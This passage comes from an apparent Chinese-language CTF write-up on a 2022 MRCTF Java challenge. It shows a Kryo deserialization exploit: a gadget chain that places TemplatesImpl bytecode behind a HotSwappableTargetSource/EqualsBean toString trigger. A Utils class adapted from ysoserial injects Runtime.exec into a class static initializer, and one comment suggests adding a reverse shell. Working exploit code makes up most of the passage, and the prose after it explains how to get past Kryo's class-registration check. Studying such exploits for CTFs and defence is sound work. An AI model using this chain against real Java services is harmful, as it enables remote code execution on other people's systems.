TemplatesImpl();</span><br><span class="line">        <span class="keyword">byte</span>[][] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;ClassPool.getDefault().get(<span class="string">&quot;demo.YYDS&quot;</span>).toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        EqualsBean bean = <span class="keyword">new</span> EqualsBean(String.class,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;beanClass&quot;</span>, Templates.class);</span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;obj&quot;</span>,templates);</span><br><span class="line">        Object gadgetChain = Utils.makeXStringToStringTrigger(templates,bean); <span class="comment">// toString() trigger</span></span><br><span class="line"></span><br><span class="line">        objectObjectHashMap.put(gadgetChain,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        kryo.writeClassAndObject(output, objectObjectHashMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deser</span><span class="params">(String raw)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bas = <span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(raw));</span><br><span class="line">        Input input = <span class="keyword">new</span> Input(bas);</span><br><span class="line">        ExtraFlavor flavor = (ExtraFlavor)<span class="keyword">this</span>.kryo.readClassAndObject(input);</span><br><span class="line">        System.out.println(flavor.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Testt test = <span class="keyword">new</span> Testt();</span><br><span class="line"></span><br><span class="line">        String ser = test.ser(<span class="string">&quot;&#123;\&quot;polish\&quot;:true,\&quot;RegistrationRequired\&quot;:false,\&quot;InstantiatorStrategy\&quot;: \&quot;org.objenesis.strategy.StdInstantiatorStrategy\&quot;&#125;&quot;</span>);</span><br><span class="line">        test.deser(ser);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及Utils类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Utility class - based on code found in ysoserial, includes method calls used in</span></span><br><span class="line"><span class="comment"> * ysoserial.payloads.util specifically the Reflections, Gadgets, and ClassFiles classes. These were</span></span><br><span class="line"><span class="comment"> * consolidated into a single util class for the sake of brevity; they are otherwise unchanged.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Additionally, uses code based on marshalsec.gadgets.ToStringUtil.makeSpringAOPToStringTrigger</span></span><br><span class="line"><span class="comment"> * to create a toString trigger</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ysoserial by Chris Frohoff - https://github.com/frohoff/ysoserial</span></span><br><span class="line"><span class="comment"> * marshalsec by Moritz Bechler - https://github.com/mbechler/marshalsec</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// special case for using TemplatesImpl gadgets with a SecurityManager enabled</span></span><br><span class="line">        System.setProperty(DESERIALIZE_TRANSLET, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for RMI remote loading</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span> <span class="params">(DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span> <span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">(<span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (InvocationHandler) Utils.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">                    command,</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Utils.StubTransletPayload.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">        <span class="keyword">final</span> CtClass clazz = pool.get(Utils.StubTransletPayload.class.getName());</span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">        String cmd = <span class="string">&quot;System.out.println(\&quot;whoops!\&quot;); java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">        clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">        CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Utils.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">                classBytes, Utils.classAsBytes(Utils.Foo.class)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Utils.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        Utils.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;<span class="string">&quot;unchecked&quot;</span>&#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="keyword">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">        Constructor&lt;? <span class="keyword">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> classAsFile(clazz, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">boolean</span> suffix)</span> </span>&#123;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getEnclosingClass() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            str = clazz.getName().replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str = classAsFile(clazz.getEnclosingClass(), <span class="keyword">false</span>) + <span class="string">&quot;$&quot;</span> + clazz.getSimpleName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (suffix) &#123;</span><br><span class="line">            str += <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classAsBytes(<span class="keyword">final</span> Class&lt;?&gt; clazz) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">final</span> String file = classAsFile(clazz);</span><br><span class="line">            <span class="keyword">final</span> InputStream in = Utils.class.getClassLoader().getResourceAsStream(file);</span><br><span class="line">            <span class="keyword">if</span> (in == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;couldn&#x27;t find &#x27;&quot;</span> + file + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Utils.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="keyword">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object tbl = Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="keyword">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="keyword">null</span>));</span><br><span class="line">        Utils.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeXStringToStringTrigger</span><span class="params">(Object o,Object bean)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Utils.makeMap(<span class="keyword">new</span> HotSwappableTargetSource(o), <span class="keyword">new</span> HotSwappableTargetSource(bean));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是当你兴冲冲的写好利用链以后，会发现几个问题</p><p>首先你会看到一行报错,<code>Class is not registered: java.util.HashMap</code></p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/10.png"></p><p>那么你肯定会疑惑这是什么玩意儿？它来自哪里？</p><p>我们可以看到在<code>com.esotericsoftware.kryo.Kryo#Kryo(com.esotericsoftware.kryo.ClassResolver, com.esotericsoftware.kryo.ReferenceResolver)</code></p><p>首先实例化的时候注册了一些基本类型</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/11.png"></p><p>然后在代码当中有<code>this.kryo.register(Mocha.class);</code></p><p>可以看到默认是<code>FieldSerializer</code></p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/12.png"></p><p>那我们也知道我们这个思路触发的核心是通过<code>com.esotericsoftware.kryo.serializers.MapSerializer</code>，但是这里我们没法自己注册怎么办呢，还记得上面那个路由么，demo路由当中可以根据我们前端传入的json当中的熟悉控制执行对应的set方法做属性更改，这里我不直接说需要更改哪些属性去解决这道题，个人更倾向于遇到一个问题解决一个问题</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/13.png"></p><p>那么既然能控制属性，我们也得知道能控制那一些，通过简单输出可以得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setWarnUnregisteredClasses</span><br><span class="line">setDefaultSerializer</span><br><span class="line">setDefaultSerializer</span><br><span class="line">setClassLoader</span><br><span class="line">setRegistrationRequired</span><br><span class="line">setReferences</span><br><span class="line">setCopyReferences</span><br><span class="line">setReferenceResolver</span><br><span class="line">setInstantiatorStrategy</span><br><span class="line">setAutoReset</span><br><span class="line">setMaxDepth</span><br><span class="line">setOptimizedGenerics</span><br></pre></td></tr></table></figure><p>回到刚刚的问题</p><p>既然如此那么我们首先需要知道在哪里抛出了这个异常，可以看到在</p><p><code>com.esotericsoftware.kryo.Kryo#getRegistration(java.lang.Class)</code></p><p>简单列出现在的调用栈，是在序列化的过程当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getRegistration:<span class="number">579</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">writeClass:<span class="number">112</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)</span><br><span class="line">writeClass:<span class="number">613</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">writeClassAndObject:<span class="number">708</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">ser:<span class="number">97</span>, Testt (demo)</span><br><span class="line">main:<span class="number">121</span>, Testt (demo)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/14.png"></p><p>可以看到根据类型在this.classResolver.getRegistration无结果就会抛出异常，通过debug输出classResolver当中的关键信息，可以很明显得到基本都是一些基本的数据类型,没有我们的Map</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>=[<span 